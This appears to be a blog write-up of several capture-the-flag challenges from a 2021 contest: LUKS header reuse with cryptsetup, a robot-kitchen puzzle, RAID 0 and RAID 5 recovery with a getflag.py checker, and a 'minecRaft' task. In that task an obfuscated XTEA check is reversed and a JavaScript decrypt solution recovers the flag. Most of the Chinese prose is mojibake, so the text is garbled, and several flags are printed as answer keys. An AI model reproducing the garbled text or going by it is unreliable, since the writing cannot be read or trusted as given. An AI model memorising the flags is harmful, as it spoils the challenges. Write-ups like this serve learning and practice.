ec 74 d0 13 06 1d 0a c2 60 c5 de 08 3f AF stripes: 4000 AF hash: sha256 Area offset:290816 [bytes] Area length:258048 [bytes] Digest ID: 0 Tokens: Digests: 0: pbkdf2 Hash: sha256 Iterations: 104857 Salt: 3c f9 97 83 b9 08 0e b0 c8 ee b5 cc 63 f1 79 1f 1f df a5 11 cc 6e 48 53 b9 04 24 36 a4 4b 8d 55 Digest: 67 59 6a 45 a1 a1 6a 8e 09 75 71 5c b6 3c 83 9f 6c 00 ad d0 a4 df fe 9a 13 01 70 f8 de 03 a2 2b å¯ä»¥å‘ç°ä»–ä»¬ header æ˜¯ç›¸åŒçš„ã€‚ å‚è€ƒ How to recover lost LUKS key or passphrase ç£ç›˜åŠ å¯†ç”¨æˆ·ä½¿ç”¨æŒ‡å— cryptsetup - Backup and Data Recovery äºæ˜¯å…ˆå¯¼å‡º day1 çš„ header backup fileï¼Œç„¶åç”¨å®ƒæ¥ç»™ day2 æ¢å¤ï¼Œå†ç”¨ day1 çš„å¯†é’¥å°±èƒ½è§£å¼€åŠ å¯†åˆ†åŒºäº†ã€‚ cryptsetup luksHeaderBackup --header-backup-file header 1.001 cryptsetup --header header luksOpen 2.001 day2 flag{changing_Pa55w0rD_d0esNot_ChangE_Luk5_ma5ter_key} æœç„¶æ˜¯æ²¡æ”¹ master keyï¼ˆ23333 æœ€åå†å¸è½½æ–‡ä»¶ç³»ç»Ÿï¼Œå…³é—­åŠ å¯†ç›˜. umount /mnt/day1 umount /mnt/day2 cryptsetup close day1 cryptsetup close day1 èµ›åšå¨æˆ¿ è™½ç„¶è¿™æ˜¯ä½ çš„é¤å…ï¼Œä½†åªæœ‰æœºå™¨äººå¯ä»¥åœ¨å¨æˆ¿å·¥ä½œã€‚æœºå™¨äººç²¾ç¡®åœ°æŒ‰ç…§ç¨‹åºå·¥ä½œï¼Œåœ¨å¨æˆ¿ä¸­ç§»åŠ¨ï¼Œä»ç‰©å“æºå–å‡ºé£Ÿæï¼ŒæŒ‰ç…§èœè°±çš„é¡ºåºæŠŠé£Ÿæä¾æ¬¡æ”¾å…¥é”…å†…ã€‚ æœºå™¨äººä¸éœ€è¦ä¼‘æ¯ï¼Œåªéœ€è¦ä¸€ä¸ªæ™šä¸Šçš„æ—¶é—´æ¥å­¦ä¹ ä½ æ•™ç»™å®ƒçš„ç¨‹åºï¼Œåœ¨æ­¤ä¹‹åä½ å°±å¯ä»¥åœ¨ä»»ä½•æ—¶å€™è®©æœºå™¨äººæ‰§è¡Œè¿™ä¸ªç¨‹åºï¼Œç¨‹åºçš„æ¯ä¸€æ­¥æ‰§è¡Œéƒ½ä¼šè¢«è®°å½•ä¸‹æ¥ï¼Œæ–¹ä¾¿ä½ æ£€æŸ¥æœºå™¨äººåšèœçš„è¿‡ç¨‹ã€‚ å¦å¤–ä¸ºäº†ç¬¦åˆé£Ÿå“å®‰å…¨æ³•çš„è¦æ±‚ï¼Œèµ›åšå¨æˆ¿ä¸­çš„æœºå™¨äººåŒä¸€æ—¶é—´æ‰‹é‡Œåªèƒ½æ‹¿ä¸€ç§é£Ÿç‰©ï¼Œæ¯æ¬¡åšèœå‰éƒ½å¿…é¡»æ‰§è¡Œæ¸…ç†å¨æˆ¿çš„æ“ä½œï¼ŒæŠŠå„å¤„çš„é£Ÿç‰©æ®‹æ¸£æ¸…ç†æ‰ï¼Œç„¶åå›åˆ°å¨æˆ¿è§’è½å¾…å‘½ã€‚ æ¯å¤©çš„èœè°±å¯èƒ½ä¸åŒï¼Œä½†ä¹Ÿè®¸ä¹Ÿå­˜åœ¨ä¸€äº›è§„å¾‹ã€‚ å¯¹æœºå™¨äººç¼–ç¨‹å¯ä»¥ä½¿ç”¨çš„æŒ‡ä»¤æœ‰ï¼ˆn, m ä¸ºæ•´æ•°å‚æ•°ï¼Œç¨‹åºçš„è¡Œå·ä» 0 å¼€å§‹ï¼Œæ³¨æ„æŒ‡ä»¤ä¸­éœ€è¦æ­£ç¡®ä½¿ç”¨ç©ºæ ¼ï¼‰ï¼š å‘ä¸Š n æ­¥ å‘ä¸‹ n æ­¥ å‘å·¦ n æ­¥ å‘å³ n æ­¥ æ”¾ä¸‹ n ä¸ªç‰©å“ æ‹¿èµ· n ä¸ªç‰©å“ æ”¾ä¸‹ç›˜å­ æ‹¿èµ·ç›˜å­ å¦‚æœæ‰‹ä¸Šçš„ç‰©å“å¤§äºç­‰äº n å‘ä¸Šè·³è½¬ m è¡Œ å¦‚æœæ‰‹ä¸Šçš„ç‰©å“å¤§äºç­‰äº n å‘ä¸‹è·³è½¬ m è¡Œ èµ¶ç´§è¿›å…¥èµ›åšå¨æˆ¿å¼€å§‹åšèœå§ï¼ è¿›å…¥ Level 0 è¿›å…¥ Level 1 è¿›å…¥ Level 2 è¿›å…¥ Level 3 Level 0å‘å³ 1 æ­¥ æ‹¿èµ· 1 ä¸ªç‰©å“ å‘ä¸‹ 1 æ­¥ å‘å·¦ 2 æ­¥ æ”¾ä¸‹ 1 ä¸ªç‰©å“ å‘å³ 1 æ­¥ å‘ä¸Š 1 æ­¥ æ‹¿èµ· 1 ä¸ªç‰©å“ å‘ä¸‹ 1 æ­¥ å‘å·¦ 1 æ­¥ æ”¾ä¸‹ 1 ä¸ªç‰©å“ Level 1ä»Šæ—¥èœè°±ç‰©å“ IDï¼š0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0 73 ä¸ª 0 è‰ï¼Œæ‰å‘ç°å®ƒçš„ å‘ä¸Šè·³è½¬ 2 è¡Œ æ˜¯è¯´ä»ç¨‹åºæ‰§è¡Œçš„ä¸Šé¢ä¸¤è¡Œå†ç»§ç»­å¾€ä¸‹æ‰§è¡Œã€‚ã€‚è€Œä¸”åœ¨è¾¹ç•Œä¸Šä¸ä¼šå†æ¬¡ç§»åŠ¨äº†ã€‚é‚£å°±ç®€å•äº†å‘€ã€‚ å‘å³ 1 æ­¥ æ‹¿èµ· 75 ä¸ªç‰©å“ å‘ä¸‹ 1 æ­¥ å‘å·¦ 1 æ­¥ æ”¾ä¸‹ 1 ä¸ªç‰©å“ å¦‚æœæ‰‹ä¸Šçš„ç‰©å“å¤§äºç­‰äº 3 å‘ä¸Šè·³è½¬ 1 è¡Œ æ”¾ä¸‹ç›˜å­ é˜µåˆ—æ¢å¤å¤§å¸ˆ 2021 å¹´ 10 æœˆ 3 æ—¥ï¼Œé˜´è½¬å°é›¨ã€‚ ä½ å‘ç°ä½ è¿è¡Œåœ¨å®éªŒå®¤æœºå™¨ä¸Šçš„ç‚¼ä¸¹è„šæœ¬æŒ‚äº†ã€‚ ã€Œå¥½å¥½çš„å›½åº†å‡æœŸï¼Œæ€ä¹ˆæˆ‘è¿˜å¾—æ¥æ”¹ç¨‹åºâ€¦â€¦ã€æ”¶åˆ°é‚®ä»¶é€šçŸ¥åï¼Œä½ ç™»å½•äº†æœºå™¨ï¼Œçœ‹åˆ°çš„å´æ˜¯ä¸€å¤§å † Input/Output Errorï¼Œå›è¿‡ç¥æ¥æ‰å‘ç°ï¼Œæ”¾æ•°æ®çš„é˜µåˆ—å¥½åƒå‡ºäº†é—®é¢˜ã€‚ ã€Œå®Œäº†ï¼ä¸Šé¢çš„æ•°æ®æˆ‘ä»æ¥æ²¡æœ‰å¤‡ä»½è¿‡ï¼è¿™ä¸‹èµ¶ä¸ä¸Š DDL å‘ä¸äº† paper äº†ï¼ã€ä½ èµ¶å¿™è·‘åˆ°æœºæˆ¿ï¼Œæ£€æŸ¥äº†ä¸€ä¸‹é˜µåˆ—çš„æƒ…å†µâ€”â€”çœ‹èµ·æ¥ç›˜æ²¡åï¼Œéƒ½èƒ½è¯»ï¼Œåªæ˜¯å¯èƒ½æ˜¯å—åˆ°ç¥ç§˜å®‡å®™å°„çº¿ï¼ˆè¯¯ï¼‰çš„å½±å“ï¼Œé˜µåˆ—çš„ç®¡ç†é¡µé¢çœ‹ä¸äº†ï¼Œæ¯å—ç›˜çš„ RAID å…ƒæ•°æ®å¥½åƒä¹Ÿå…¨ä¸è§äº†ï¼Œæ›´è¦å‘½çš„æ˜¯ï¼Œä½ å¿˜äº†å½“åˆç»„é˜µåˆ—æ—¶å€™ç›˜çš„é¡ºåºå’Œå…¶ä»–çš„å‚æ•°ã€‚æ€ä¹ˆæ¢å¤æ•°æ®å‘¢ï¼Ÿä¸Šç½‘æœç´¢ä¸€ä¸‹ï¼Œå¥½åƒå¾—èŠ±ä¸å°‘é’±ã€‚ä½†ä½ å¬è¯´ä½ çš„åŒå­¦æœ€è¿‘åœ¨æä¿¡æ¯ä»€ä¹ˆå¤§èµ›â€”â€”æˆ–è®¸å¯ä»¥è®©ä»–ä»¬è¯•è¯•ï¼Ÿ ä»¥ä¸‹æ˜¯ä¸¤ä¸ªå‹ç¼©åŒ…ï¼Œåˆ†åˆ«æ˜¯ä¸€ä¸ª RAID 0 é˜µåˆ—çš„ç£ç›˜å‹ç¼©åŒ…ï¼Œå’Œä¸€ä¸ª RAID 5 é˜µåˆ—çš„ç£ç›˜å‹ç¼©åŒ…ï¼Œå¯¹åº”æœ¬é¢˜çš„ä¸¤å°é—®ã€‚ä½ éœ€è¦è§£æå¾—åˆ°æ­£ç¡®å®Œæ•´çš„ç£ç›˜é˜µåˆ—ï¼ŒæŒ‚è½½ç¬¬ä¸€ä¸ªåˆ†åŒºååœ¨è¯¥åˆ†åŒºæ ¹ç›®å½•ä¸‹ä½¿ç”¨ Python 3.7 æˆ–ä»¥ä¸Šç‰ˆæœ¬æ‰§è¡Œ getflag.py è„šæœ¬ä»¥è·å– flagã€‚ç£ç›˜æ•°æ®ä¿è¯æ— æŸåã€‚ RAID 0 é˜µåˆ—å‹ç¼©åŒ…ï¼ŒSHA256: f73bee3a2dce201566573f51bd28026c467182601eb6e55130db10c7c0c8127f RAID 5 é˜µåˆ—å‹ç¼©åŒ…ï¼ŒSHA256: 5eb1d2042ab5f8e2ee1508bf5e66632b4c307a595099e499aa9bc2a7255a6009 RAID 5 RAIDçº§åˆ« è¯¥ç¨‹åºæ”¯æŒä½¿ç”¨æ“ä½œç³»ç»Ÿæˆ–ä¸»æ¿ä»¥åŠä½¿ç”¨å„ç§åˆ¶é€ å•†çš„æ§åˆ¶å™¨å’Œå¤–éƒ¨å­˜å‚¨è®¾å¤‡åˆ›å»ºçš„ç£ç›˜é˜µåˆ— ç¡¬ç›˜é˜µåˆ—ï¼š JBODæ˜¯ç£ç›˜çš„é¡ºåºåˆå¹¶ã€‚ç”¨ä¿¡æ¯å¡«å……ç£ç›˜åï¼Œæ•°æ®å°†å†™å…¥ä¸‹ä¸€ä¸ªæ•°æ®ã€‚ç”¨äºå¢åŠ ç©ºé—´ã€‚è‡³å°‘éœ€è¦2ä¸ªï¼ˆä¸¤ä¸ªï¼‰ç£ç›˜ã€‚ RAID 0 æ˜¯å‘æ‰€æœ‰ç£ç›˜å†™å…¥å—çš„é¡ºåºæ›¿æ¢ã€‚ç”¨äºå¢åŠ ç©ºé—´å¹¶åŠ å¿«æ•°æ®è®¿é—®ã€‚æœ€å°‘2ï¼ˆä¸¤ï¼‰ä¸ªç£ç›˜ã€‚ RAID 1è¿™æ˜¯é˜µåˆ—ä¸­æ‰€æœ‰ç£ç›˜ä¸Šçš„æ•°æ®é‡å¤ã€‚ç”¨äºä¿æŠ¤æ•°æ®ä»¥é˜²ä¸¢å¤±ã€‚è‡³å°‘2ï¼ˆä¸¤ï¼‰ä¸ªç£ç›˜ã€‚ RAID 10 (1 + 0).è‡³å°‘4ï¼ˆå››ï¼‰ä¸ªç£ç›˜ã€‚ RAID 1E (1 + 0 åŒ…æ‹¬æ”¹è¿›).è‡³å°‘3ï¼ˆä¸‰ï¼‰ä¸ªç£ç›˜ã€‚ RAID 5 æ˜¯å°†æ•°æ®ä¸æ ¡éªŒå’Œçš„ä¿ç•™è¿›è¡Œäº¤ç»‡ã€‚ 2ä¸ªï¼ˆä¸¤ä¸ªï¼‰ç£ç›˜å‘ç”Ÿæ•…éšœåå¯ä»¥è‡ªè¡Œæ¢å¤ã€‚åŠ å¿«ç£ç›˜å·¥ä½œï¼Œæ‰©å±•ç©ºé—´å¹¶ä¿æŠ¤æ•°æ®ä¸ä¸¢å¤±ã€‚è‡³å°‘ä¸‰ï¼ˆ3ï¼‰ä¸ªç£ç›˜ã€‚ RAID 50 (5 + 0).è‡³å°‘6ï¼ˆå…­ï¼‰ä¸ªç£ç›˜ã€‚ RAID 5E å’Œ 5EE ï¼ˆç±»ä¼¼äºçº§åˆ«5ï¼Œåœ¨â€œçƒ­æ’æ‹”â€çš„æƒ…å†µä¸‹æœ‰ä¸€ä¸ªé¢å¤–çš„ç£ç›˜ï¼‰ã€‚çº§åˆ«5EEä¸5Eçš„ä¸åŒä¹‹å¤„åœ¨äºï¼Œçƒ­æ’æ‹”é©±åŠ¨å™¨ä¸æ˜¯ç©ºé—²çš„ï¼Œè€Œæ˜¯ä¸å…¶ä½™é©±åŠ¨å™¨ä¸€èµ·ä½¿ç”¨ã€‚ è‡³å°‘4ï¼ˆå››ï¼‰ä¸ªç£ç›˜ã€‚ RAID 6 æ˜¯ä½¿ç”¨ä¸¤ä¸ªæ ¡éªŒå’Œçš„æ•°æ®äº¤ç»‡ã€‚ä½¿ç”¨é‡Œå¾·ï¼ˆReedï¼‰æ‰€ç½—é—¨ç¼–ç ã€‚ç³»ç»Ÿå¯ä»¥ä»ä¸¤ä¸ªç£ç›˜æ•…éšœä¸­è‡ªæˆ‘æ¢å¤ã€‚ä¸ç¬¬äº”çº§ç›¸æ¯”ï¼Œç¬¬å…­çº§ç”¨äºå¢åŠ ç£ç›˜ç©ºé—´ï¼Œè¯»å–å’Œå†™å…¥é€Ÿåº¦å¹¶æé«˜å¯é æ€§ æœ€å°‘4ï¼ˆå››ï¼‰ä¸ªç£ç›˜ã€‚ RAID 60 (6 + 0).æœ€å°‘8ï¼ˆå…«ï¼‰ä¸ªç£ç›˜ã€‚ RAID 2 â€“ç»“åˆäº†ä¸¤ç»„ç£ç›˜ï¼šå¸¦æœ‰æ•°æ®å’Œå¸¦æœ‰çº é”™ä»£ç ã€‚åŸºäºæ±‰æ˜ç ï¼Œä¸å¤§é‡å…‰ç›˜æœ‰å…³ã€‚ æœ€å°‘3ï¼ˆä¸‰ï¼‰ä¸ªç£ç›˜ã€‚ RAID 3 ä¸ç¬¬äº”çº§ç±»ä¼¼ï¼Œä½†æ˜¯æ ¡éªŒå’Œä¸æ˜¯åœ¨æ‰€æœ‰ç£ç›˜ä¹‹é—´äº¤é”™ï¼Œè€Œæ˜¯å§‹ç»ˆå†™å…¥å…¶ä¸­ä¸€ä¸ªç£ç›˜ã€‚è¿™ä¼šå¤§å¤§å¢åŠ å¸¦æœ‰æ ¡éªŒå’Œçš„ç£ç›˜ç£¨æŸã€‚è¯¥çº§åˆ«ä½¿ç”¨1ï¼ˆä¸€ä¸ªï¼‰å­—èŠ‚å¤§å°çš„å—ã€‚ RAID 4 æ­¤çº§åˆ«æ˜¯ä»RAID 3ç»§æ‰¿çš„ï¼ŒåŒºåˆ«åœ¨äºå—å¤§å°å¯ä»¥å¤§äº1ï¼ˆä¸€ä¸ªï¼‰å­—èŠ‚ã€‚ æœäº†ä¸€ä¸‹ï¼Œç”¨ Hetman RAID Recoveryâ„¢ è¿™ç©æ„å¯ä»¥æ¢å¤ï¼ˆ å¥½åƒ EasyRecovery ä¹Ÿè¡Œï¼Œä¸è¿‡å’±æ²¡è¯•ã€‚ ä½†æ„Ÿè§‰è¿™ä¸ªè½¯ä»¶ä¸­æ–‡ç•Œé¢æœ‰ç‚¹é”…ï¼Œä¼šå‡ºç° Zenithal Zä½¬å¼é—®å·ï¼ˆï¿½ EXT4 æ ¼å¼ è¿˜æœ‰ Windows ä¸Šç”¨æ„Ÿè§‰æœ‰ç‚¹é—®é¢˜ï¼Œç›´æ¥å¯¼å‡º zip ä¼šå¡ä½ï¼Œå–µå–µæ˜¯å…ˆå¯¼å‡ºæ•´ä¸ªé•œåƒ dsk æ–‡ä»¶ï¼Œç„¶ååœ¨ DiskGenius é‡Œå†æŠŠ /files/ ç›®å½•ä¸‹æ–‡ä»¶æ¢å¤å‡ºæ¥çš„ã€‚ getflag.py #!/usr/bin/env python3 # Flag is here. # Don't peek in my file, as they are my privacy. # Just execute me to get flag please! import hashlib import os import sys ans = \"\" paths = [] if __name__ == '__main__': path = os.environ.get(\"FILES\", \"./files/\") if not os.path.exists(path): print(\"files folder not found: set FILES environment variable if you are not in the root of my disk image.\") sys.exit(-1) for root, dirs, files in os.walk(path): for filename in files: if filename == '.DS_Store': continue filepath = os.path.join(root, filename) paths.append(filepath) paths.sort() for filepath in paths: h = hashlib.sha256() with open(filepath, 'rb') as f: while True: chunk = f.read(h.block_size) if not chunk: break h.update(chunk) hexdigest = h.hexdigest() print(filepath, hexdigest) ans += hexdigest check = hashlib.sha256(ans.encode(\"utf-8\")).hexdigest() if check == \"df81eca70a025e5f2b5d3ba56ac1289b2112a1c041cbe1b199ac5a8049fbf9d7\": print(\"Flag:\", f\"flag{{{hashlib.md5(ans.encode('utf-8')).hexdigest()}}}\") else: print(\"Did you recover my data correctly?\") å‘ç°å¾—åœ¨ Linux ä¸‹è·‘ï¼ŒWindows ä¸‹ä¸æˆåŠŸï¼Œä¼šé—®ä½  Did you recover my data correctly? flag{a18325a1ec0f58292908455c2df8ffcd} èµ›åå¬è¯´ç›´æ¥ DiskGenius ç»„å»ºè™šæ‹Ÿ raidï¼Œæ’ä¸€ä¸‹é¡ºåºå°±èƒ½è§£ï¼Œæ‘¸äº†ã€‚ RAID 0åŒç†ï¼Œä½†è¿™ä¸ªè‡ªåŠ¨æœç´¢èµ·æ¥å·¨æ…¢â€¦â€¦è·‘äº†äºŒåå‡ åˆ†é’Ÿï¼Œå‘ç°äº†507ä¸ªé…ç½®ã€‚ XFS è‰ï¼Œä¸æ‡‚ä¸ºå•¥è¿™ä¸ªæ–‡ä»¶ç³»ç»Ÿä¸ç®¡æ˜¯å¦æ¢å¤è¢«åˆ é™¤çš„æ–‡ä»¶å‡ºæ¥ï¼Œæœ€åç®—å‡ºæ¥çš„ç»“æœéƒ½ä¸å¯¹ï¼Œä¸æ‡‚å“ªé‡Œé”…äº†ï¼Œä½›äº†â€¦â€¦ å“ªä½å¸ˆå‚…èƒ½æä¾›ä¸ªæ­£ç¡®æ¢å¤å‡ºæ¥çš„æ–‡ä»¶ç»™å–µå–µ diff ä¸€ä¸‹å‘¢ï¼ˆ å™¢å¯¹ï¼Œè®²ä¸ªæ•…äº‹ï¼Œè¿™ä¸ªé•œåƒæ’å¥½çš„é¡ºåºå¿˜è®°è®°å½•ä¸‹æ¥äº†ï¼Œæƒ¨æƒ¨ï¼Œå•¥æ—¶å€™æ¢ç§æ–¹å¼é‡æ–°æ‹¼å§ã€‚ minecRaft kk åŒå­¦å¾ˆå–œæ¬¢ç© Minecraftï¼Œä»–æœ€è¿‘æ”¶åˆ°äº†ä¸€å¼  MC åœ°å›¾ï¼Œåœ°å›¾é‡Œé¢æœ‰ä¸‰ç›ç¯ï¼Œè¿˜æœ‰å¾ˆå¤šå¥‡å¥‡æ€ªæ€ªçš„å‹åŠ›æ¿ã€‚ ä½†ä»–å‘ç°è¿™äº›ç¯å¥½åƒä¸å¤ªç¬¦åˆ MC ç”µç£å­¦ï¼ˆRed stoneï¼‰ï¼Œä½ èƒ½å¸®ä»–æŠŠç¯å…¨éƒ¨ç‚¹äº®å—ï¼Ÿ æ³¨ï¼šæœ¬é¢˜è§£æ³•ä¸åŸç‰ˆ Minecraft æ¸¸æˆæ— å…³ã€‚ http://202.38.93.111:12899/ è¡¥å……è¯´æ˜ï¼šflag èŠ±æ‹¬å·å†…ä¸ºè®©ä¸‰ç›ç¯å…¨éƒ¨ç‚¹äº®çš„æœ€çŸ­çš„è¾“å…¥åºåˆ—ã€‚ä¾‹å¦‚ï¼Œå¦‚æœè¸©è¸å‹åŠ›æ¿è¾“å…¥çš„æœ€çŸ­çš„åºåˆ—ä¸º abcï¼Œåˆ™ç­”æ¡ˆä¸º flag{abc}ã€‚ è¿™ä¸ª MC å¯ä¸ç®€å•â€¦â€¦ çœ‹ä¸Šå»æ˜¯ä¸ªæ¸¸æˆï¼Œå®é™…ä¸Šæ˜¯ä¸ªé€†å‘é¢˜ã€‚ é¦–å…ˆè¿™é¢˜é‡Œé¢æœ‰ä¸ªç”¨æ¥åçˆ¬è™«çš„å®šæ—¶å™¨ debugger å¡æ­»æµè§ˆå™¨è°ƒè¯•çª—å£ï¼Œå¯ä»¥æŠ“åŒ…ï¼Œæ”¹è¿”å›åŒ…æŠŠè¿™éƒ¨åˆ†å»æ‰ã€‚ å…¥å£åœ¨è¿™é‡Œï¼Œè¾“å…¥çš„å­—ç¬¦é•¿åº¦ä¸º32ï¼Œä¼šè°ƒç”¨ flag.js é‡Œçš„ gyflagh å‡½æ•°è¿›è¡Œæ ¡éªŒï¼Œå¦‚æœè¿”å› true åˆ™ç»“æœæ­£ç¡®ã€‚ ç„¶è€Œï¼Œflag.js é‡Œå‡½æ•°è¿›è¡Œäº†æ··æ·†ï¼Œå¯æ¶å•Šï¼ï¼ï¼ è¿›è¡Œäº†å¥½ä¸€ç•ªé™æ€+åŠ¨æ€è°ƒè¯•ï¼Œå¤§æ¦‚çš„é€»è¾‘æ˜¯ä¸‹é¢è¿™æ ·ã€‚ å‰é¢æœ‰ä¸ªåŒ¿åå‡½æ•°ï¼Œç»™ Strings ç±»å®šä¹‰äº†ä¸€ä¸ª encrypt æ–¹æ³•ã€‚ gyflagh çš„å‚æ•°å°±æ˜¯æˆ‘ä»¬çš„è¾“å…¥ï¼Œç»è¿‡ encrypt åä¸ 6fbde674819a59bfa12092565b4ca2a7a11dc670c678681daf4afb6704b82f0c åšå¯¹æ¯”ï¼Œç›¸åŒåˆ™æ­£ç¡®ã€‚ è€Œ encrypt é‡Œä¾æ¬¡å–å‡º flag çš„å‰å››ä½ã€åå››ä½ï¼Œè½¬æ¢ä¸º long ç±»å‹ï¼Œè¿›è¡Œ codeã€‚ å†çœ‹ codeï¼Œå®é™…ä¸Šå®ƒè¿›è¡Œäº† 32 è½®å˜åŒ–ï¼Œè¿™ä¸ª 2654435769 å…¶å®å°±æ˜¯ç†Ÿæ‚‰çš„ 0x9e3779b9ï¼Œå³ Tiny Encryption Algorithm (TEA) ç®—æ³•å¸¸é‡ã€‚è¿™é‡Œå…¶å®ç”¨åˆ°çš„æ˜¯ XTEA åŠ å¯†ç®—æ³•ã€‚ String['prototype'][\"encrypt\"] = function (param) { // param = \"1356853149054377\" x1 = new Array(2), x2 = new Array(4); let result = ''; plaintext = escape(this); //flag for (var i = 0; i &lt; 4; i++) x2[i] = Str4ToLong(\"1356853149054377\" [\"slice\"](i * 4, (i + 1) * 4)); // x2 = [ 909456177, 825439544, 892352820, 926364468 ] for (i = 0; i &lt; 32; i += 8) { //plaintext[\"length\"] x1[0] = Str4ToLong(plaintext['slice'](i, i + 4)), //å‰4ä½ x1[1] = Str4ToLong(plaintext[\"slice\"](i + 4, i + 8)), //å4ä½ //console.log('x1:', x1, 'x2:', x2); code(x1, x2), //console.log('===code===&gt; x1:', x1, 'x2:', x2); let tmp = LongToBase16(x1[0]) + LongToBase16(x1[1]); console.log(tmp); result += tmp; // LongToBase16 8ä½ e.g. \"00000926\" } return result; // \"6fbde674819a59bfa12092565b4ca2a7a11dc670c678681daf4afb6704b82f0c\" length=64 } function gyflagh(_0x111955) { // const _0x50051f = _0x22517d; let _0x3b790d = _0x111955[\"encrypt\"](\"1356853149054377\"); if (_0x3b790d === \"6fbde674819a59bfa12092565b4ca2a7a11dc670c678681daf4afb6704b82f0c\") return true; return false; } function code(x1, x2) { // x2 = [ 909456177, 825439544, 892352820, 926364468 ] let y1 = x1[0], y2 = x1[1]; let i = 0; while (i != 84941944608) { // 32è½® y1 += (y2 &lt;&lt; 4 ^ y2 &gt;&gt;&gt; 5) + y2 ^ i + x2[i &amp; 3], i += 2654435769, y2 += (y1 &lt;&lt; 4 ^ y1 &gt;&gt;&gt; 5) + y1 ^ i + x2[i &gt;&gt;&gt; 11 &amp; 3]; } x1[0] = y1, x1[1] = y2; } äºæ˜¯è§£å¯†å°±åè¿‡æ¥å†™å°±å®Œäº‹äº†ã€‚ Exp: function decrypt(v) { let key = [909456177, 825439544, 892352820, 926364468]; let i; let v0 = v[0], v1 = v[1], delta = 0x9E3779B9, sum = delta * 32; for (i = 0; i &lt; 32; i++) { v1 -= (((v0 &lt;&lt; 4) ^ (v0 &gt;&gt;&gt; 5)) + v0) ^ (sum + key[(sum &gt;&gt;&gt; 11) &amp; 3]); sum -= delta; v0 -= (((v1 &lt;&lt; 4) ^ (v1 &gt;&gt;&gt; 5)) + v1) ^ (sum + key[sum &amp; 3]); } v[0] = v0; v[1] = v1; return v; } var cipher = \"6fbde674819a59bfa12092565b4ca2a7a11dc670c678681daf4afb6704b82f0c\"; var x1_list = []; for (let i = 0; i &lt; 64; i += 8) { console.log(cipher[\"slice\"](i, (i + 8))); let tmp = Base16ToLong(cipher[\"slice\"](i, (i + 8))); console.log(tmp); x1_list.push(tmp); } var result = ''; for (let i = 0; i &lt; 8; i += 2) { let xx = [x1_list[i], x1_list[i + 1]]; decrypt(xx); r0 = LongToStr4(xx[0]); console.log(r0); r1 = LongToStr4(xx[1]); console.log(r1); result += r0 + r1; } console.log(result); // \"McWebRE_inMlnCrA1t_3a5y_1cIuop9i\" flag{McWebRE_inMlnCrA1t_3a5y_1cIuop9i} è¿™é¢˜è€—è´¹äº†å–µå–µå¥½å‡ å¤©æ—¶é—´ï¼Œåˆšå¼€å§‹åœ¨æƒ³ä¸ºå•¥ Base16ToLong å’Œ LongToBase16 ç»“æœä¸ä¸€æ ·ï¼Œåè€…åªå–äº†8ä½çš„ hexï¼Œå¯¼è‡´è½¬æ¢å›å»ä¸å¯¹ã€‚ ä½†æœ€åå‘ç°å…¶å®ä¸æ˜¯ä¸Šé¢é‚£ä¸ªé—®é¢˜ï¼Œæ˜¯ XTEA è§£å¯†å‡½æ•°å†™é”™äº†ï¼Œå‘ç°åˆæ²¡è€ƒè™‘ æœ‰ç¬¦å·æ•°ä¸æ— ç¬¦å·æ•°çš„é—®é¢˜ï¼Œä¹Ÿå°±æ˜¯ &gt;&gt; å’Œ &gt;&gt;&gt; ã€‚ã€‚ã€‚ å–µå–µæ˜¯ fwï¼ˆ Unsigned right shift (&gt;&gt;&gt;) The unsigned right shift operator (&gt;&gt;&gt;) (zero-fill right shift) shifts the first operand the specified number of bits to the right. Excess bits shifted off to the right are discarded. Zero bits are shifted in from the left. The sign bit becomes 0, so the result is always non-negative. Unlike the other bitwise operators, zero-fill right shift returns an unsigned 32-bit integer. via https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Operators/Unsigned_right_shift TEAã€XTEAã€XXTEAåŠ å¯†è§£å¯†ç®—æ³• Pythonå®ç°TEAã€XTEAã€XXTEAåŠ å¯†è§£å¯†ç®—æ³• å·ç‹ä¸é‡ç”Ÿçš„ GPA â€œ24 å²ï¼Œæ˜¯å·ç‹ã€‚â€ å³ä¾¿ä¸€æ—©å­¦ä¼šäº†å…»ç”Ÿã€æ”¶è·äº†å¼ºè€…çš„å‘å‹ï¼Œ24 å²çš„ç§‘å¤§å·ç‹ä»ç„¶æ— æ³•è¶…è„±å¼€â€œç”µå­é¸¦ç‰‡â€çš„è¼æ¯’ã€‚ æœ€è¿‘ï¼Œä»–å–œæ¬¢ç©ä¸€æ¬¾ç»å…¸çš„æŒæœºã€‚è¿™å°æŒæœºæ¨å‡ºäº 2001 å¹´ï¼Œæ›¾ç»é£é¡å…¨çƒï¼Œé”€é‡ç´¯è®¡ 8100 ä¸‡å°ã€‚ ä»¤å·ç‹éå¸¸å¿«ä¹çš„æ˜¯ï¼Œè¿™å°æŒæœºä½¿ç”¨äº† ARM æŒ‡ä»¤é›†ï¼Œæ­£å¥½å°±æ˜¯ä¸Šä¸ªå­¦æœŸåœ¨ã€Šå¾®æœºåŸç†ä¸åµŒå…¥å¼ç³»ç»Ÿã€‹ä¸­å­¦ä¹ çš„å†…å®¹ã€‚ å°±ç®—æ˜¯æ²‰è¿·â€œç”µå­é¸¦ç‰‡â€ï¼Œå·ç‹ä¹Ÿä¸å¿˜è®°è¦åœ¨è½»æ¾å¨±ä¹çš„æ—¶å…‰ä¸­è·å– GPAã€‚ è¿™å¤©ï¼Œå·ç‹å¾—åˆ°äº†ä¸€å¼ ç ´æ—§çš„æ¸¸æˆå¡å¸¦ã€‚ï¼ˆé¡ºå¸¦åœ°ï¼Œä»–è¿˜å¾—åˆ°äº†å¡å¸¦çƒ§å½•ä¹‹å‰ç¼–è¯‘çš„ ELF æ–‡ä»¶ï¼‰ å½“å¹´åœ¨è¿™å°æ¸¸æˆæœºä¸Šï¼Œå°‘å¹´ä»¬å¤œä»¥ç»§æ—¥æ•æ‰ç€ä¼ è¯´ä¸­çš„ç²¾çµï¼› è€Œå°±åœ¨å·ç‹å†’é™©çš„è¿‡ç¨‹ä¸­ã€é‡ç”Ÿçš„ GPA è·³äº†å‡ºæ¥ï¼ æ‰‹ä¸Šæ²¡æœ‰ä»»ä½•è£…å¤‡çš„å·ç‹å·ä¸èµ·æ¥ï¼Œä¸æ„¿èººå¹³çš„ä»–åœ¨æƒŠæ…Œä¹‹ä¸­è¾“å…¥äº†ç»å…¸çš„ä½œå¼Šç ã€‚ 